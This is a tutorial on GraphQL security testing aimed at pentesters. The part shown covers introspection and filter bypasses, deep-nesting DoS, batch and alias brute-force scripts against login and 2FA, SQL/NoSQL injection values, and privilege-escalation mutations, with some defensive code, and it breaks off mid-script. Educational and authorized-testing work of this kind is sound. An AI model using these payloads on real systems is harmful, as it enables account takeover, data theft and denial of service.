# Security Deep Dive Part 9: GraphQL Security Testing -- The Complete Offensive and Defensive Guide

---

**Series:** Application Security Deep Dive -- Offensive and Defensive Techniques for Modern Web Applications
**Part:** 9 (GraphQL Security Testing)
**Audience:** Bug bounty hunters, penetration testers, security researchers, and backend developers who understand HTTP, REST API security, Node.js, FastAPI, JWT, and general web application architecture
**Reading time:** ~60 minutes

---

**Meta Description:** A comprehensive technical guide to GraphQL security testing for penetration testers and bug bounty hunters. Covers introspection abuse, deep query nesting DoS, broken authorization in resolvers, batch query abuse, alias-based rate limit bypass, GraphQL injection, mutation abuse, subscription exploitation, IDOR, and complete tooling workflows with InQL, graphql-voyager, Altair, and Burp Suite. Includes vulnerable and hardened code samples for Apollo Server (Express.js) and Strawberry (FastAPI).

**Slug:** `graphql-security-testing-complete-offensive-defensive-guide`

**Keywords:** GraphQL security, GraphQL penetration testing, introspection query abuse, GraphQL DoS, deep query nesting, GraphQL authorization bypass, batch query attack, GraphQL alias rate limit bypass, GraphQL injection, mutation abuse, GraphQL IDOR, InQL Burp Suite, graphql-voyager, Apollo Server security, Strawberry GraphQL security, GraphQL bug bounty

---

## Introduction

GraphQL has fundamentally changed how APIs are built and consumed. Instead of fixed REST endpoints, clients send structured queries that specify exactly what data they want. This flexibility is a feature for developers and a gold mine for attackers. A single GraphQL endpoint replaces dozens of REST routes, concentrating the entire attack surface into one URL. The schema is self-documenting (often exposed via introspection). The query language allows recursive nesting, field aliasing, batch operations, and variable injection -- each of which introduces security implications that most developers never consider.

In bug bounty programs, GraphQL targets are consistently among the most rewarding. The attack surface is dense: one endpoint, one query language, but dozens of types, hundreds of fields, and complex authorization logic that must be implemented per-resolver. Developers who migrated from REST often assume that GraphQL frameworks handle authorization automatically. They do not. Every resolver is a potential authorization bypass. Every type relationship is a potential IDOR. Every nested query is a potential denial-of-service vector.

This article is a complete offensive reference for GraphQL security testing. We cover every major attack technique, provide real payloads and HTTP request examples, walk through Burp Suite workflows, demonstrate vulnerable Apollo Server and Strawberry/FastAPI code alongside hardened versions, and explain the tooling ecosystem (InQL, graphql-voyager, Altair). Every technique has been used in real bug bounty reports and penetration tests.

If you encounter a GraphQL API in your next engagement, this is the article you want open in a tab.

---

## Table of Contents

1. [Introspection Query Abuse](#1-introspection-query-abuse-full-schema-extraction)
2. [Disabling Introspection: Bypass Techniques](#2-disabling-introspection-bypass-techniques)
3. [Deep Query Nesting (DoS via Nested Queries)](#3-deep-query-nesting-dos-via-nested-queries)
4. [Excessive Data Exposure](#4-excessive-data-exposure-querying-fields-not-meant-for-users)
5. [Broken Authorization in GraphQL Resolvers](#5-broken-authorization-in-graphql-resolvers)
6. [Hidden Fields Discovery (Field Suggestion Abuse)](#6-hidden-fields-discovery-field-suggestion-abuse)
7. [Batch Query Abuse](#7-batch-query-abuse-multiple-operations-in-one-request)
8. [GraphQL Rate Limit Bypass via Aliases](#8-graphql-rate-limit-bypass-via-aliases)
9. [GraphQL Injection](#9-graphql-injection-injecting-into-variables)
10. [Mutation Abuse (Unauthorized Data Modification)](#10-mutation-abuse-unauthorized-data-modification)
11. [Subscription Abuse](#11-subscription-abuse)
12. [GraphQL IDOR](#12-graphql-idor)
13. [Express.js Apollo Server: Vulnerable + Fixed Code](#13-expressjs-apollo-server-vulnerable--fixed-code)
14. [FastAPI Strawberry: Vulnerable + Fixed Code](#14-fastapi-strawberry-vulnerable--fixed-code)
15. [Tools: InQL, graphql-voyager, Altair](#15-tools-inql-graphql-voyager-altair)
16. [Burp Suite Workflow for GraphQL Testing](#16-burp-suite-workflow-for-graphql-testing)
17. [Introspection Query Payloads](#17-introspection-query-payloads)
18. [Common Developer Mistakes](#18-common-developer-mistakes)
19. [Detection Strategies](#19-detection-strategies)
20. [Prevention Strategies](#20-prevention-strategies)
21. [Bug Bounty Report Example](#21-bug-bounty-report-example)
22. [Lab Setup Ideas](#22-lab-setup-ideas)
23. [Conclusion](#23-conclusion)

---

## 1. Introspection Query Abuse (Full Schema Extraction)

### What Is Introspection?

GraphQL's introspection system allows clients to query the schema itself. This is a built-in feature of the GraphQL specification, designed for tooling like GraphiQL and Apollo Studio. When enabled, any client can send a special query that returns the complete schema: every type, every field, every argument, every mutation, every subscription, every enum value, and every relationship.

For an attacker, this is the equivalent of having the API documentation, database schema, and route map handed to you on a silver platter.

### The Full Introspection Query

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } interfaces { kind name ofType { kind name ofType { kind name ofType { kind name } } } } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } directives { name description locations args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } } } }"
}
```

### Simplified Introspection Queries

For quick reconnaissance, use these targeted queries:

**List all types:**

```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

**List all queries:**

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
          }
        }
        type {
          name
          kind
        }
      }
    }
  }
}
```

**List all mutations:**

```graphql
{
  __schema {
    mutationType {
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
            ofType {
              name
            }
          }
        }
      }
    }
  }
}
```

**Get fields for a specific type:**

```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### HTTP Request Example

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "query": "{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"
}
```

**Response (abbreviated):**

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "users",
            "args": [
              { "name": "role", "type": { "name": "String" } },
              { "name": "includeInactive", "type": { "name": "Boolean" } }
            ]
          },
          {
            "name": "user",
            "args": [
              { "name": "id", "type": { "name": "ID" } }
            ]
          },
          {
            "name": "adminDashboard",
            "args": []
          },
          {
            "name": "internalMetrics",
            "args": [
              { "name": "service", "type": { "name": "String" } }
            ]
          },
          {
            "name": "exportUserData",
            "args": [
              { "name": "userId", "type": { "name": "ID" } },
              { "name": "format", "type": { "name": "String" } }
            ]
          }
        ]
      },
      "mutationType": {
        "fields": [
          {
            "name": "updateUserRole",
            "args": [
              { "name": "userId", "type": { "name": "ID", "kind": "SCALAR", "ofType": null } },
              { "name": "role", "type": { "name": "String", "kind": "SCALAR", "ofType": null } }
            ]
          },
          {
            "name": "deleteUser",
            "args": [
              { "name": "userId", "type": { "name": "ID", "kind": "SCALAR", "ofType": null } }
            ]
          },
          {
            "name": "generateApiKey",
            "args": [
              { "name": "permissions", "type": { "name": null, "kind": "LIST", "ofType": { "name": "String" } } }
            ]
          }
        ]
      }
    }
  }
}
```

From this single response, an attacker now knows about `adminDashboard`, `internalMetrics`, `updateUserRole`, `deleteUser`, and `generateApiKey` -- none of which would be discoverable through normal application usage.

### What to Look For in Introspection Results

1. **Admin/internal queries**: `adminDashboard`, `internalMetrics`, `systemConfig`, `debugInfo`
2. **Sensitive mutations**: `updateUserRole`, `deleteUser`, `resetPassword`, `generateApiKey`, `approveTransaction`
3. **Types with sensitive fields**: `User` type having `passwordHash`, `ssn`, `creditCard`, `apiKey`, `internalNotes`
4. **Hidden relationships**: `User.adminActions`, `Order.internalStatus`, `Payment.rawCardData`
5. **Deprecated fields**: Deprecated fields often still work and may have weaker authorization
6. **Debug/test queries**: `_debug`, `_test`, `_internal`, `rawQuery`

---

## 2. Disabling Introspection: Bypass Techniques

### Common Approaches to Disabling Introspection

Many organizations disable introspection in production. Common methods include:

- Apollo Server: `introspection: false` in server config
- Express middleware that blocks queries containing `__schema` or `__type`
- WAF rules that match introspection keywords
- Custom validation rules that reject introspection queries

### Bypass 1: GET-Based Introspection

Some servers disable introspection for POST requests but forget about GET:

```http
GET /graphql?query={__schema{types{name}}} HTTP/1.1
Host: target.example.com
```

### Bypass 2: Using __type Instead of __schema

If the filter blocks `__schema` but not `__type`, you can enumerate types one at a time:

```graphql
{
  __type(name: "Query") {
    fields {
      name
      type { name }
    }
  }
}
```

Then enumerate each discovered type:

```graphql
{
  __type(name: "User") {
    fields {
      name
      type { name kind }
    }
  }
}
```

### Bypass 3: Aliasing __schema

```graphql
{
  s: __schema {
    types {
      name
    }
  }
}
```

### Bypass 4: Fragment-Based Introspection

```graphql
fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    type {
      ...TypeRef
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
  }
}

{
  __schema {
    types {
      ...FullType
    }
  }
}
```

### Bypass 5: Whitespace and Encoding Tricks

**Newline injection to bypass regex filters:**

```json
{
  "query": "{\n  __schema\n  {\n    types\n    {\n      name\n    }\n  }\n}"
}
```

**Unicode escape in query string:**

```json
{
  "query": "{ __sch\u0065ma { types { name } } }"
}
```

**Tab characters:**

```json
{
  "query": "{\t__schema\t{\ttypes\t{\tname\t}\t}\t}"
}
```

### Bypass 6: Batch Request with Introspection

Embed the introspection query within a batch of normal queries:

```json
[
  { "query": "{ user(id: \"1\") { name } }" },
  { "query": "{ __schema { types { name } } }" }
]
```

The WAF may only inspect the first query in the batch.

### Bypass 7: POST with Different Content-Type

Some filters only inspect `application/json`. Try:

```http
POST /graphql HTTP/1.1
Content-Type: application/graphql

{ __schema { types { name } } }
```

Or URL-encoded form data:

```http
POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query={__schema{types{name}}}
```

### When Introspection Is Truly Disabled

If all bypass attempts fail, move to field suggestion abuse (Section 6) and use tools like `clairvoyance` to reconstruct the schema through brute-force field name guessing.

---

## 3. Deep Query Nesting (DoS via Nested Queries)

### The Vulnerability

GraphQL allows queries to follow type relationships to arbitrary depth. If a schema has circular relationships (very common), an attacker can construct exponentially expanding queries that consume server resources.

Consider a schema where `User` has `friends` (which returns `[User]`), and each `User` has `posts` (which returns `[Post]`), and each `Post` has `author` (which returns `User`):

```graphql
{
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    name
                    email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Each level multiplies the number of database queries. If each user has 10 friends, 8 levels of nesting produces 10^8 = 100,000,000 resolver calls.

### Real-World DoS Payload

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "query": "{ users { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name email posts { title comments { author { friends { name } } } } } } } } } } } } } } }"
}
```

### Exponential Expansion via Fragments

Fragments can be used to make the nesting less obvious:

```graphql
fragment UserFields on User {
  name
  email
  friends {
    ...FriendFields
  }
}

fragment FriendFields on User {
  name
  friends {
    ...DeepFriendFields
  }
}

fragment DeepFriendFields on User {
  name
  friends {
    name
    friends {
      name
      friends {
        name
        friends {
          name
        }
      }
    }
  }
}

query {
  users {
    ...UserFields
  }
}
```

### HTTP Request Example for Testing

Start with shallow nesting and increase depth while monitoring response time:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"query": "{ users { name } }"}
```

Response time: 50ms

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"query": "{ users { friends { friends { friends { name } } } } }"}
```

Response time: 2,500ms

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"query": "{ users { friends { friends { friends { friends { friends { name } } } } } } } }"}
```

Response time: timeout (>30s)

The exponential increase in response time confirms the DoS vulnerability. Document the depth at which the server becomes unresponsive.

### Severity Assessment

Query depth DoS is typically rated **Medium to High** depending on:

- Whether authentication is required (unauthenticated = higher severity)
- Whether the server crashes or just becomes slow
- Whether it affects other users (shared infrastructure)
- Whether rate limiting exists

---

## 4. Excessive Data Exposure (Querying Fields Not Meant for Users)

### The Problem

In REST APIs, the server controls exactly what fields are returned. In GraphQL, the client controls the field selection. If a `User` type has `passwordHash`, `internalNotes`, `creditCardLast4`, or `ssn` fields, any client can request them -- unless per-field authorization is implemented (and it usually is not).

### Reconnaissance via Introspection

After extracting the schema, look for sensitive fields on every type:

```graphql
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

**Response revealing sensitive fields:**

```json
{
  "data": {
    "__type": {
      "fields": [
        { "name": "id", "type": { "name": "ID" } },
        { "name": "email", "type": { "name": "String" } },
        { "name": "name", "type": { "name": "String" } },
        { "name": "role", "type": { "name": "String" } },
        { "name": "passwordHash", "type": { "name": "String" } },
        { "name": "ssn", "type": { "name": "String" } },
        { "name": "internalNotes", "type": { "name": "String" } },
        { "name": "apiKey", "type": { "name": "String" } },
        { "name": "creditCard", "type": { "name": "CreditCard" } },
        { "name": "loginHistory", "type": { "name": null } },
        { "name": "failedLoginAttempts", "type": { "name": "Int" } },
        { "name": "twoFactorSecret", "type": { "name": "String" } }
      ]
    }
  }
}
```

### Exploitation

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "{ users { id email name passwordHash ssn internalNotes apiKey twoFactorSecret creditCard { number expiry cvv } } }"
}
```

**Response:**

```json
{
  "data": {
    "users": [
      {
        "id": "1",
        "email": "admin@example.com",
        "name": "Admin User",
        "passwordHash": "$2b$12$LJ3m4ys3Lk8vOuN6yUj4ruAGnnCmQEXIS1..",
        "ssn": "123-45-6789",
        "internalNotes": "VIP customer, bypass rate limits",
        "apiKey": "ak_live_7f8a9b2c3d4e5f6g7h8i9j0k",
        "twoFactorSecret": "JBSWY3DPEHPK3PXP",
        "creditCard": {
          "number": "4111111111111111",
          "expiry": "12/27",
          "cvv": "123"
        }
      }
    ]
  }
}
```

### Fields to Always Request When Testing

When you discover a type through introspection or schema extraction, always try requesting every field. Pay special attention to:

```
passwordHash, password, hashedPassword
ssn, socialSecurityNumber, taxId
creditCard, cardNumber, cvv, pan
apiKey, secretKey, accessToken, refreshToken
twoFactorSecret, totpSecret, mfaSecret
internalNotes, adminNotes, staffNotes
role, permissions, isAdmin, isSuperuser
salary, compensation
ipAddress, lastLoginIp
resetToken, passwordResetToken
```

---

## 5. Broken Authorization in GraphQL Resolvers

### The Root Cause

In REST APIs, authorization is often applied at the route level via middleware:

```javascript
// REST: Authorization at route level
app.get('/admin/users', requireAdmin, (req, res) => { ... });
```

In GraphQL, there is one route (`/graphql`), and authorization must be implemented in every resolver. Developers frequently:

1. Apply authorization to the top-level query but not to nested resolvers
2. Forget to check authorization on mutations that modify other users' data
3. Apply role checks inconsistently across queries and mutations
4. Rely on the frontend not displaying certain queries rather than enforcing server-side

### Scenario: Nested Resolver Bypass

The `me` query is properly authorized -- it returns only the current user's data. But what if the `User` type has a `company` field, and `Company` has an `employees` field?

```graphql
{
  me {
    name
    company {
      name
      employees {
        name
        email
        salary
        ssn
        role
      }
    }
  }
}
```

The `me` resolver checks authentication. The `company` resolver checks that the user belongs to that company. But does the `employees` resolver check whether the requesting user is authorized to see salary and SSN data for all employees? Often, it does not.

### Scenario: Direct Query vs. Nested Access

```graphql
# This query is properly protected - returns 403
{
  adminDashboard {
    totalRevenue
    userStats
  }
}

# But accessing the same data through a different path works
{
  me {
    organization {
      dashboard {
        totalRevenue
        userStats
      }
    }
  }
}
```

### Scenario: Mutation Authorization Bypass

```graphql
# Cannot update other users through the "proper" admin mutation
mutation {
  adminUpdateUser(userId: "victim-id", data: { role: "admin" }) {
    id
    role
  }
}
# Returns: "Not authorized"

# But the generic updateUser mutation does not check ownership
mutation {
  updateUser(id: "victim-id", input: { role: "admin" }) {
    id
    role
  }
}
# Returns: success - role changed to admin
```

### HTTP Request Example

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "mutation { updateUser(id: \"other-user-uuid\", input: { role: \"admin\" }) { id email role } }"
}
```

### Testing Methodology

1. Extract the full schema via introspection
2. For every query and mutation, try accessing it with different privilege levels:
   - Unauthenticated
   - Authenticated as a regular user
   - Authenticated as a different regular user (for IDOR)
   - Authenticated as an admin
3. For every nested field, check if authorization is enforced at each level
4. For every mutation, test if you can modify other users' data by changing ID parameters

---

## 6. Hidden Fields Discovery (Field Suggestion Abuse)

### How Field Suggestions Work

When you query a field that does not exist on a type, most GraphQL implementations return a helpful error message that suggests similar field names:

```graphql
{
  user(id: "1") {
    pasword
  }
}
```

**Response:**

```json
{
  "errors": [
    {
      "message": "Cannot query field \"pasword\" on type \"User\". Did you mean \"password\" or \"passwordHash\"?",
      "locations": [{ "line": 3, "column": 5 }]
    }
  ]
}
```

The server just revealed that `password` and `passwordHash` fields exist on the `User` type -- even if introspection is disabled.

### Systematic Field Discovery

By sending queries with deliberately misspelled field names, you can discover hidden fields through suggestions. This technique works even when introspection is completely disabled.

**Discovery payloads:**

```graphql
# Discover fields starting with "pass"
{ user(id: "1") { pas } }
# Suggestion: "password", "passwordHash", "passwordResetToken"

# Discover fields starting with "admin"
{ user(id: "1") { admi } }
# Suggestion: "admin", "adminNotes", "isAdmin"

# Discover fields starting with "secret"
{ user(id: "1") { secre } }
# Suggestion: "secret", "secretKey", "secretQuestion"

# Discover fields starting with "internal"
{ user(id: "1") { intern } }
# Suggestion: "internal", "internalId", "internalNotes"

# Discover fields starting with "token"
{ user(id: "1") { toke } }
# Suggestion: "token", "tokenExpiry", "refreshToken"
```

### Automated Field Discovery with Clairvoyance

The `clairvoyance` tool automates this process, using a wordlist to systematically discover fields and reconstruct the schema when introspection is disabled:

```bash
# Install
pip install clairvoyance

# Run schema reconstruction
clairvoyance https://target.example.com/graphql -o schema.json -w /path/to/graphql-wordlist.txt
```

### HTTP Request Example

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "{ user(id: \"1\") { passwor } }"
}
```

**Response:**

```json
{
  "errors": [
    {
      "message": "Cannot query field \"passwor\" on type \"User\". Did you mean \"password\", \"passwordHash\", or \"passwordResetToken\"?",
      "extensions": {
        "code": "GRAPHQL_VALIDATION_FAILED"
      }
    }
  ]
}
```

### Disabling Field Suggestions (Defense)

**Apollo Server (Node.js):**

```javascript
const { ApolloServer } = require('@apollo/server');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    // Custom rule to strip suggestions from error messages
    (context) => ({
      Field(node) {
        // Validation happens at the framework level
        // The suggestion stripping is handled via formatError
      }
    })
  ],
  formatError: (formattedError) => {
    // Remove "Did you mean..." suggestions from error messages
    if (formattedError.message.includes('Did you mean')) {
      return {
        ...formattedError,
        message: formattedError.message.replace(/Did you mean.*$/, '').trim(),
      };
    }
    return formattedError;
  },
});
```

---

## 7. Batch Query Abuse (Multiple Operations in One Request)

### How Batch Queries Work

Most GraphQL implementations support sending an array of operations in a single HTTP request:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

[
  { "query": "{ user(id: \"1\") { name email } }" },
  { "query": "{ user(id: \"2\") { name email } }" },
  { "query": "{ user(id: \"3\") { name email } }" }
]
```

### Batch Login Brute Force

The most common exploit: bypass rate limiting on login mutations by batching thousands of login attempts in a single request:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

[
  { "query": "mutation { login(email: \"admin@example.com\", password: \"password1\") { token } }" },
  { "query": "mutation { login(email: \"admin@example.com\", password: \"password2\") { token } }" },
  { "query": "mutation { login(email: \"admin@example.com\", password: \"password3\") { token } }" },
  { "query": "mutation { login(email: \"admin@example.com\", password: \"password4\") { token } }" },
  { "query": "mutation { login(email: \"admin@example.com\", password: \"password5\") { token } }" },
  { "query": "mutation { login(email: \"admin@example.com\", password: \"Summer2025!\") { token } }" }
]
```

**Response:**

```json
[
  { "data": { "login": null }, "errors": [{ "message": "Invalid credentials" }] },
  { "data": { "login": null }, "errors": [{ "message": "Invalid credentials" }] },
  { "data": { "login": null }, "errors": [{ "message": "Invalid credentials" }] },
  { "data": { "login": null }, "errors": [{ "message": "Invalid credentials" }] },
  { "data": { "login": null }, "errors": [{ "message": "Invalid credentials" }] },
  { "data": { "login": { "token": "eyJhbGciOiJIUzI1NiIs..." } } }
]
```

Six login attempts, one HTTP request, one rate limit "hit." If the rate limit is 10 requests per minute, you can make 60 login attempts per minute.

### Batch 2FA Code Bruteforce

Same technique against 2FA verification:

```json
[
  { "query": "mutation { verify2FA(code: \"000000\") { success } }" },
  { "query": "mutation { verify2FA(code: \"000001\") { success } }" },
  { "query": "mutation { verify2FA(code: \"000002\") { success } }" },
  { "query": "mutation { verify2FA(code: \"000003\") { success } }" }
]
```

With batch sizes of 1000 per request and a 6-digit TOTP code (1,000,000 combinations), you need only 1,000 HTTP requests to try every possible code.

### Batch User Enumeration

```json
[
  { "query": "{ user(id: \"1\") { id name email } }" },
  { "query": "{ user(id: \"2\") { id name email } }" },
  { "query": "{ user(id: \"3\") { id name email } }" },
  { "query": "{ user(id: \"4\") { id name email } }" },
  { "query": "{ user(id: \"5\") { id name email } }" }
]
```

### Generating Large Batch Payloads

```python
import json

# Generate a batch brute-force payload for 2FA
batch = []
for code in range(0, 10000):
    batch.append({
        "query": f'mutation {{ verify2FA(code: "{code:06d}") {{ success token }} }}'
    })

# Split into chunks of 100 (many servers limit batch size)
chunks = [batch[i:i+100] for i in range(0, len(batch), 100)]

for i, chunk in enumerate(chunks):
    with open(f'batch_payload_{i}.json', 'w') as f:
        json.dump(chunk, f)
```

---

## 8. GraphQL Rate Limit Bypass via Aliases

### How Aliases Work

GraphQL aliases allow you to query the same field multiple times with different arguments in a single query by giving each instance a unique alias:

```graphql
{
  user1: user(id: "1") { name email }
  user2: user(id: "2") { name email }
  user3: user(id: "3") { name email }
}
```

### Rate Limit Bypass

If rate limiting is applied per HTTP request (not per GraphQL operation), aliases allow thousands of operations in a single request:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "query": "{ a1: login(email: \"admin@example.com\", password: \"pass1\") { token } a2: login(email: \"admin@example.com\", password: \"pass2\") { token } a3: login(email: \"admin@example.com\", password: \"pass3\") { token } a4: login(email: \"admin@example.com\", password: \"pass4\") { token } a5: login(email: \"admin@example.com\", password: \"pass5\") { token } }"
}
```

**Response:**

```json
{
  "data": {
    "a1": { "token": null },
    "a2": { "token": null },
    "a3": { "token": null },
    "a4": { "token": null },
    "a5": { "token": "eyJhbGciOiJIUzI1NiIs..." }
  }
}
```

### Alias-Based Brute Force: Full Payload Generator

```python
import json

target_email = "admin@example.com"
passwords = open("rockyou-top-10000.txt").read().splitlines()

# Generate alias-based brute force in batches of 50
batch_size = 50
for batch_num in range(0, len(passwords), batch_size):
    batch_passwords = passwords[batch_num:batch_num + batch_size]
    aliases = []
    for i, pwd in enumerate(batch_passwords):
        # Escape special characters in password for GraphQL string
        escaped_pwd = pwd.replace('\\', '\\\\').replace('"', '\\"')
        aliases.append(f'a{i}: login(email: "{target_email}", password: "{escaped_pwd}") {{ token }}')

    query = "{ " + " ".join(aliases) + " }"

    payload = json.dumps({"query": query})
    print(f"# Batch {batch_num // batch_size}")
    print(payload)
    print()
```

### Key Difference Between Batch Queries and Aliases

| Feature | Batch Queries | Aliases |
|---------|--------------|---------|
| Format | JSON array of operations | Single operation with aliases |
| Server support | Not always enabled | Always supported (part of GraphQL spec) |
| Detection | Easier (array at top level) | Harder (single valid query) |
| Rate limit bypass | Per-request limits | Per-request limits |
| WAF evasion | Moderate | Higher (looks like a normal query) |

### Defense Against Alias Abuse

Count the number of top-level fields (including aliases) and enforce a limit:

```javascript
// Apollo Server plugin to limit aliases
const aliasLimitPlugin = {
  requestDidStart() {
    return {
      async didResolveOperation(requestContext) {
        const { operation } = requestContext;
        if (operation) {
          const fieldCount = operation.selectionSet.selections.length;
          if (fieldCount > 10) {
            throw new Error(`Query contains ${fieldCount} top-level fields. Maximum is 10.`);
          }
        }
      },
    };
  },
};
```

---

## 9. GraphQL Injection (Injecting into Variables)

### The Vulnerability

GraphQL injection occurs when user input is interpolated directly into a GraphQL query string on the server side (in a backend-for-frontend pattern) or when variables are passed directly into database queries without sanitization.

### Server-Side Query Construction (Vulnerable BFF Pattern)

A Backend-For-Frontend service constructs GraphQL queries from user input:

```javascript
// VULNERABLE: String interpolation into GraphQL query
app.get('/api/search', async (req, res) => {
  const searchTerm = req.query.q;

  // Constructing GraphQL query with string concatenation
  const query = `
    {
      searchUsers(term: "${searchTerm}") {
        id
        name
        email
      }
    }
  `;

  const result = await graphqlClient.request(query);
  res.json(result);
});
```

**Injection payload:**

```
GET /api/search?q=test") { id name email } adminUsers: users(role: "admin") { id name email passwordHash apiKey } # HTTP/1.1
Host: target.example.com
```

The constructed query becomes:

```graphql
{
  searchUsers(term: "test") { id name email }
  adminUsers: users(role: "admin") { id name email passwordHash apiKey }
  # ") {
  #   id name email
  # }
}
```

The injected alias `adminUsers` queries all admin users with sensitive fields. The `#` comments out the remaining original query.

### Variable Injection

When variables are passed through without type validation:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "query": "query SearchUsers($term: String!) { searchUsers(term: $term) { id name } }",
  "variables": {
    "term": "test",
    "__proto__": { "isAdmin": true }
  }
}
```

While GraphQL itself is strongly typed and resistant to SQL-like injection in variables, the resolvers behind the queries often pass variables directly to databases:

```javascript
// VULNERABLE resolver: passes variable directly to MongoDB
const resolvers = {
  Query: {
    users: async (_, { filter }) => {
      // If filter = { role: { $ne: null } }, this returns ALL users
      return await User.find(filter);
    },
  },
};
```

**NoSQL injection via GraphQL variable:**

```json
{
  "query": "query GetUsers($filter: UserFilter!) { users(filter: $filter) { id name email role } }",
  "variables": {
    "filter": {
      "role": { "$ne": null }
    }
  }
}
```

### SQL Injection via GraphQL Variables

If the resolver constructs SQL directly:

```javascript
// VULNERABLE: SQL concatenation in resolver
const resolvers = {
  Query: {
    user: async (_, { id }) => {
      const result = await pool.query(`SELECT * FROM users WHERE id = '${id}'`);
      return result.rows[0];
    },
  },
};
```

```json
{
  "query": "query GetUser($id: ID!) { user(id: $id) { id name email } }",
  "variables": {
    "id": "1' UNION SELECT id, email, password_hash FROM users--"
  }
}
```

### Prevention

Always use parameterized queries in resolvers and never construct GraphQL queries via string interpolation:

```javascript
// SAFE: Parameterized query
const resolvers = {
  Query: {
    user: async (_, { id }) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
      return result.rows[0];
    },
  },
};
```

---

## 10. Mutation Abuse (Unauthorized Data Modification)

### Common Vulnerable Mutations

After schema extraction, identify mutations that modify sensitive data:

```graphql
# Privilege escalation
mutation {
  updateUserRole(userId: "attacker-id", role: "ADMIN") {
    id
    role
  }
}

# Unauthorized password reset
mutation {
  resetPassword(userId: "victim-id", newPassword: "attacker-password") {
    success
  }
}

# Financial manipulation
mutation {
  updateOrderAmount(orderId: "12345", amount: 0.01) {
    id
    amount
    status
  }
}

# Creating admin accounts
mutation {
  createUser(input: {
    email: "attacker@evil.com"
    password: "password123"
    role: "ADMIN"
  }) {
    id
    email
    role
  }
}

# Approving own requests
mutation {
  approveRequest(requestId: "my-request-id") {
    id
    status
    approvedBy
  }
}

# Generating API keys with elevated permissions
mutation {
  generateApiKey(input: {
    name: "test"
    permissions: ["admin:read", "admin:write", "users:delete"]
  }) {
    key
    permissions
  }
}
```

### HTTP Request Example

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{
  "query": "mutation UpdateRole($userId: ID!, $role: String!) { updateUserRole(userId: $userId, role: $role) { id email role } }",
  "variables": {
    "userId": "admin-uuid-here",
    "role": "SUPERADMIN"
  }
}
```

### Testing Methodology

1. **Enumerate all mutations** via introspection
2. **Test each mutation** with your regular user token
3. **Modify ID parameters** to target other users' resources
4. **Modify enum/role fields** to escalate privileges
5. **Test mutations without authentication** (remove the Authorization header)
6. **Test with expired or invalid tokens** (some implementations skip auth on error)

### Chaining Mutations

Sometimes individual mutations are harmless, but chained together they enable attacks:

```graphql
# Step 1: Create an organization (allowed for any user)
mutation {
  createOrganization(name: "Evil Corp") {
    id
  }
}

# Step 2: Invite the target user to your organization
mutation {
  inviteUserToOrg(orgId: "evil-corp-id", userId: "victim-id") {
    success
  }
}

# Step 3: As org admin, modify the user's role
mutation {
  updateOrgMemberRole(orgId: "evil-corp-id", userId: "victim-id", role: "MEMBER") {
    success
  }
}

# Step 4: Access the victim's data through the org relationship
{
  organization(id: "evil-corp-id") {
    members {
      id
      email
      personalData {
        ssn
        address
      }
    }
  }
}
```

---

## 11. Subscription Abuse

### How GraphQL Subscriptions Work

Subscriptions use WebSocket connections to push real-time updates to clients. The typical flow:

1. Client opens WebSocket connection to `ws://target.example.com/graphql`
2. Client sends a subscription query
3. Server pushes data whenever the subscribed event occurs

### Subscribing to Other Users' Events

```json
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { orderUpdated(userId: \"victim-user-id\") { id status totalAmount items { name price } shippingAddress { street city zip } } }"
  }
}
```

If the subscription resolver does not verify that the requesting user is authorized to receive updates for the specified `userId`, the attacker receives real-time updates about the victim's orders.

### Subscription DoS

Opening many concurrent WebSocket connections with resource-intensive subscriptions:

```python
import asyncio
import websockets
import json

async def open_subscription(url, query):
